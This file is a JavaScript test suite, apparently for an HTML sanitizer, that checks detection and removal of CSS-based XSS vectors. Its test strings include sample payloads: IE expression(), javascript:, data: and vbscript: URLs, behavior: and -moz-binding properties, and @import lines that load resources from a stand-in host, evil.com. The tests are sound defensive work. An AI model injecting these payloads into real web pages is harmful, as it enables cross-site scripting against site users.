/**
 * CSS Injection Attack Tests
 *
 * Tests prevention of CSS-based XSS attacks:
 * - expression() attacks (IE)
 * - @import attacks
 * - url() with dangerous protocols
 * - behavior: property (IE)
 * - -moz-binding (Firefox)
 *
 * References:
 * - https://owasp.org/www-community/attacks/CSS_Injection
 * - https://portswigger.net/web-security/cross-site-scripting/contexts#xss-in-html-tag-attributes
 */

import { describe, it, expect } from 'vitest'
import { sanitize } from '../../../src/core/sanitizer.js'
import {
  hasDangerousCSS,
  isForbiddenCSSProperty,
  isSafeCSSProperty,
  sanitizeCSS,
  validateStyleAttribute,
} from '../../../src/validators/css.js'

describe('CSS Injection Prevention', () => {
  describe('Dangerous CSS pattern detection', () => {
    it('should detect expression() attack (IE)', () => {
      const result = hasDangerousCSS('width: expression(alert(1))')
      expect(result.dangerous).toBe(true)
      expect(result.reason).toContain('expression')
    })

    it('should detect EXPRESSION() (case insensitive)', () => {
      expect(hasDangerousCSS('width: EXPRESSION(alert(1))').dangerous).toBe(true)
      expect(hasDangerousCSS('width: ExPrEsSiOn(alert(1))').dangerous).toBe(true)
    })

    it('should detect @import attack', () => {
      const result = hasDangerousCSS('@import url(http://evil.com/xss.css)')
      expect(result.dangerous).toBe(true)
      expect(result.reason).toContain('@import')
    })

    it('should detect javascript: in url()', () => {
      const result = hasDangerousCSS('background: url(javascript:alert(1))')
      expect(result.dangerous).toBe(true)
    })

    it('should detect javascript: with quotes', () => {
      expect(hasDangerousCSS('background: url("javascript:alert(1)")').dangerous).toBe(true)
      expect(hasDangerousCSS("background: url('javascript:alert(1)')").dangerous).toBe(true)
    })

    it('should detect data: protocol in url()', () => {
      const result = hasDangerousCSS('background: url(data:text/html,<script>alert(1)</script>)')
      expect(result.dangerous).toBe(true)
    })

    it('should detect vbscript: protocol', () => {
      const result = hasDangerousCSS('background: url(vbscript:msgbox(1))')
      expect(result.dangerous).toBe(true)
    })

    it('should detect behavior: as forbidden property (IE)', () => {
      // behavior: is a forbidden property, not a dangerous pattern
      expect(isForbiddenCSSProperty('behavior')).toBe(true)
    })

    it('should detect -moz-binding as forbidden property (Firefox)', () => {
      // -moz-binding: is a forbidden property, not a dangerous pattern
      expect(isForbiddenCSSProperty('-moz-binding')).toBe(true)
    })

    it('should allow safe CSS', () => {
      expect(hasDangerousCSS('color: red').dangerous).toBe(false)
      expect(hasDangerousCSS('background-color: #fff').dangerous).toBe(false)
      expect(hasDangerousCSS('width: 100px').dangerous).toBe(false)
    })
  })

  describe('Forbidden CSS properties', () => {
    it('should detect behavior as forbidden', () => {
      expect(isForbiddenCSSProperty('behavior')).toBe(true)
      expect(isForbiddenCSSProperty('BEHAVIOR')).toBe(true)
    })

    it('should detect -moz-binding as forbidden', () => {
      expect(isForbiddenCSSProperty('-moz-binding')).toBe(true)
      expect(isForbiddenCSSProperty('-MOZ-BINDING')).toBe(true)
    })

    it('should detect binding as forbidden', () => {
      expect(isForbiddenCSSProperty('binding')).toBe(true)
    })

    it('should allow safe CSS properties', () => {
      expect(isForbiddenCSSProperty('color')).toBe(false)
      expect(isForbiddenCSSProperty('width')).toBe(false)
      expect(isForbiddenCSSProperty('background')).toBe(false)
    })
  })

  describe('Safe CSS property whitelist', () => {
    it('should recognize safe layout properties', () => {
      expect(isSafeCSSProperty('display')).toBe(true)
      expect(isSafeCSSProperty('position')).toBe(true)
      expect(isSafeCSSProperty('width')).toBe(true)
      expect(isSafeCSSProperty('height')).toBe(true)
    })

    it('should recognize safe text properties', () => {
      expect(isSafeCSSProperty('color')).toBe(true)
      expect(isSafeCSSProperty('font-size')).toBe(true)
      expect(isSafeCSSProperty('text-align')).toBe(true)
    })

    it('should recognize safe flexbox properties', () => {
      expect(isSafeCSSProperty('display')).toBe(true)
      expect(isSafeCSSProperty('flex-direction')).toBe(true)
      expect(isSafeCSSProperty('justify-content')).toBe(true)
    })

    it('should not recognize dangerous properties as safe', () => {
      expect(isSafeCSSProperty('behavior')).toBe(false)
      expect(isSafeCSSProperty('-moz-binding')).toBe(false)
    })
  })

  describe('CSS sanitization (non-strict mode)', () => {
    it('should remove expression() entirely', () => {
      const result = sanitizeCSS('width: expression(alert(1))')
      expect(result).toBe('')
    })

    it('should remove forbidden properties', () => {
      const css = 'color: red; behavior: url(xss.htc); width: 100px'
      const result = sanitizeCSS(css)
      expect(result).toContain('color: red')
      expect(result).toContain('width: 100px')
      expect(result).not.toContain('behavior')
    })

    it('should remove @import', () => {
      const css = '@import url(evil.css); color: red'
      const result = sanitizeCSS(css)
      expect(result).toBe('')  // Entire CSS removed due to dangerous pattern
    })

    it('should remove javascript: in url()', () => {
      const css = 'background: url(javascript:alert(1))'
      const result = sanitizeCSS(css)
      expect(result).toBe('')
    })

    it('should preserve safe CSS', () => {
      const css = 'color: red; background-color: blue; width: 100px'
      const result = sanitizeCSS(css)
      expect(result).toBe(css)
    })

    it('should handle multiple properties', () => {
      const css = 'color: red; behavior: url(xss.htc); background: blue; -moz-binding: url(xss.xml)'
      const result = sanitizeCSS(css)
      expect(result).toContain('color: red')
      expect(result).toContain('background: blue')
      expect(result).not.toContain('behavior')
      expect(result).not.toContain('-moz-binding')
    })
  })

  describe('CSS sanitization (strict mode)', () => {
    it('should only allow whitelisted properties', () => {
      const css = 'color: red; unknown-property: value; width: 100px'
      const result = sanitizeCSS(css, true)
      expect(result).toContain('color: red')
      expect(result).toContain('width: 100px')
      expect(result).not.toContain('unknown-property')
    })

    it('should remove non-whitelisted properties', () => {
      const css = 'color: red; custom-prop: test; background: blue'
      const result = sanitizeCSS(css, true)
      expect(result).toContain('color: red')
      expect(result).toContain('background: blue')
      expect(result).not.toContain('custom-prop')
    })

    it('should still block dangerous patterns', () => {
      const css = 'color: red; width: expression(alert(1))'
      const result = sanitizeCSS(css, true)
      // expression() makes entire CSS dangerous
      expect(result).toBe('')
    })
  })

  describe('Style attribute validation', () => {
    it('should reject style when allowStyleAttribute=false', () => {
      const result = validateStyleAttribute('color: red', { allowStyleAttribute: false })
      expect(result.allowed).toBe(false)
      expect(result.reason).toContain('not allowed')
    })

    it('should allow safe CSS when allowStyleAttribute=true', () => {
      const result = validateStyleAttribute('color: red', { allowStyleAttribute: true })
      expect(result.allowed).toBe(true)
      expect(result.sanitizedValue).toBe('color: red')
    })

    it('should reject expression() attack', () => {
      const result = validateStyleAttribute('width: expression(alert(1))', { allowStyleAttribute: true })
      expect(result.allowed).toBe(false)
      expect(result.reason).toContain('Dangerous CSS')
    })

    it('should sanitize CSS with forbidden properties', () => {
      const result = validateStyleAttribute('color: red; behavior: url(xss.htc)', {
        allowStyleAttribute: true
      })
      expect(result.allowed).toBe(true)
      expect(result.sanitizedValue).toContain('color: red')
      expect(result.sanitizedValue).not.toContain('behavior')
    })

    it('should enforce strict mode when enabled', () => {
      const result = validateStyleAttribute('color: red; unknown-prop: test', {
        allowStyleAttribute: true,
        strictCSSValidation: true
      })
      expect(result.allowed).toBe(true)
      expect(result.sanitizedValue).toContain('color: red')
      expect(result.sanitizedValue).not.toContain('unknown-prop')
    })
  })

  describe('Style attribute sanitization via sanitize()', () => {
    it('should remove style attribute by default (not allowed)', () => {
      const html = '<div style="color: red">Text</div>'
      const result = sanitize(html)
      expect(result).not.toContain('style=')
      expect(result).toBe('<div>Text</div>')
    })

    it('should allow safe CSS when allowStyleAttribute=true', () => {
      const html = '<div style="color: red; background: blue">Text</div>'
      const result = sanitize(html, { allowStyleAttribute: true })
      expect(result).toContain('style=')
      expect(result).toContain('color: red')
      expect(result).toContain('background: blue')
    })

    it('should block expression() attack', () => {
      const html = '<div style="width: expression(alert(1))">Text</div>'
      const result = sanitize(html, { allowStyleAttribute: true })
      expect(result).not.toContain('style=')
      expect(result).not.toContain('expression')
      expect(result).toBe('<div>Text</div>')
    })

    it('should sanitize forbidden properties', () => {
      const html = '<div style="color: red; behavior: url(xss.htc); width: 100px">Text</div>'
      const result = sanitize(html, { allowStyleAttribute: true })
      expect(result).toContain('color: red')
      expect(result).toContain('width: 100px')
      expect(result).not.toContain('behavior')
    })

    it('should block @import attack', () => {
      const html = '<div style="@import url(evil.css); color: red">Text</div>'
      const result = sanitize(html, { allowStyleAttribute: true })
      expect(result).not.toContain('style=')
      expect(result).not.toContain('@import')
    })

    it('should block javascript: in url()', () => {
      const html = '<div style="background: url(javascript:alert(1))">Text</div>'
      const result = sanitize(html, { allowStyleAttribute: true })
      expect(result).not.toContain('style=')
      expect(result).not.toContain('javascript:')
    })

    it('should block data: protocol in url()', () => {
      const html = '<div style="background: url(data:text/html,<script>alert(1)</script>)">Text</div>'
      const result = sanitize(html, { allowStyleAttribute: true })
      expect(result).not.toContain('style=')
      expect(result).not.toContain('data:')
    })

    it('should block -moz-binding attack', () => {
      const html = '<div style="-moz-binding: url(xss.xml#xss)">Text</div>'
      const result = sanitize(html, { allowStyleAttribute: true })
      expect(result).not.toContain('style=')
      expect(result).not.toContain('-moz-binding')
    })
  })

  describe('Known CSS-based XSS vectors', () => {
    it('should prevent IE expression() attack', () => {
      // Classic IE CSS expression attack
      const html = '<div style="width: expression(alert(\'XSS\'))">Content</div>'
      const result = sanitize(html, { allowStyleAttribute: true })
      expect(result).not.toContain('expression')
      expect(result).toBe('<div>Content</div>')
    })

    it('should prevent IE behavior: attack', () => {
      // IE HTC file loading
      const html = '<div style="behavior: url(xss.htc)">Content</div>'
      const result = sanitize(html, { allowStyleAttribute: true })
      expect(result).not.toContain('behavior')
    })

    it('should prevent Firefox -moz-binding attack', () => {
      // Firefox XBL binding
      const html = '<div style="-moz-binding: url(http://evil.com/xss.xml#xss)">Content</div>'
      const result = sanitize(html, { allowStyleAttribute: true })
      expect(result).not.toContain('-moz-binding')
    })

    it('should prevent @import CSS injection', () => {
      // CSS @import to load external malicious stylesheet
      const html = '<div style="@import \'http://evil.com/xss.css\'">Content</div>'
      const result = sanitize(html, { allowStyleAttribute: true })
      expect(result).not.toContain('@import')
      expect(result).not.toContain('evil.com')
    })
  })

  describe('Strict CSS validation mode', () => {
    it('should only allow whitelisted properties', () => {
      const html = '<div style="color: red; custom-property: value; width: 100px">Text</div>'
      const result = sanitize(html, {
        allowStyleAttribute: true,
        strictCSSValidation: true
      })
      expect(result).toContain('color: red')
      expect(result).toContain('width: 100px')
      expect(result).not.toContain('custom-property')
    })

    it('should block unknown properties in strict mode', () => {
      const html = '<div style="color: red; -webkit-unknown: test">Text</div>'
      const result = sanitize(html, {
        allowStyleAttribute: true,
        strictCSSValidation: true
      })
      expect(result).toContain('color: red')
      expect(result).not.toContain('-webkit-unknown')
    })
  })
})
